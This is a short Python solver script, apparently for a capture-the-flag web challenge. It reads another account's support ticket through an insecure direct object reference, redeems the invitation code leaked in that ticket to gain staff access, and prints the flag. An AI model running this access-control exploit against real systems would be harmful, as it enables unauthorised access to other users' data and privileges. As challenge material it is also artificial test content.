"""Read another account's inquiry, redeem its invitation and open the staff page."""
from http.cookiejar import CookieJar
import json
import re
from urllib.error import HTTPError
from urllib.request import build_opener, HTTPCookieProcessor, Request


class Client:
    def __init__(self, base='http://app:8000'):
        self.base = base
        self.opener = build_opener(HTTPCookieProcessor(CookieJar()))

    def request(self, path, body=None):
        request = Request(self.base + path, data=json.dumps(body).encode() if body is not None else None,
                          headers={'Accept': 'application/json', 'Content-Type': 'application/json'})
        try:
            with self.opener.open(request, timeout=5) as response:
                return response.status, json.loads(response.read())
        except HTTPError as error:
            return error.code, json.loads(error.read())


def solve():
    client = Client()
    status, state = client.request('/api/desk')
    assert status == 200 and state['role'] == 'member' and 'pwnden{' not in json.dumps(state)
    assert [t['id'] for t in state['tickets']] == [310]
    assert client.request('/api/staff')[0] == 403
    assert client.request('/api/ticket?id=310')[0] == 200
    status, body = client.request('/api/ticket?id=311')
    if status != 200:
        assert status == 403
        raise SystemExit(3)
    code = body['ticket']['invitation_code']
    status, state = client.request('/api/invitation', {'code': code})
    if status != 200:
        assert status == 403
        raise SystemExit(3)
    assert state['user'] == 'member'
    status, body = client.request('/api/staff')
    assert status == 200
    flag = body['staff']['confirmation']
    assert re.fullmatch(r'pwnden\{[0-9a-f]{32}\}', flag)
    other = Client()
    assert other.request('/api/desk')[1]['role'] == 'member'
    assert other.request('/api/staff')[0] == 403
    print(flag)


if __name__ == '__main__':
    solve()
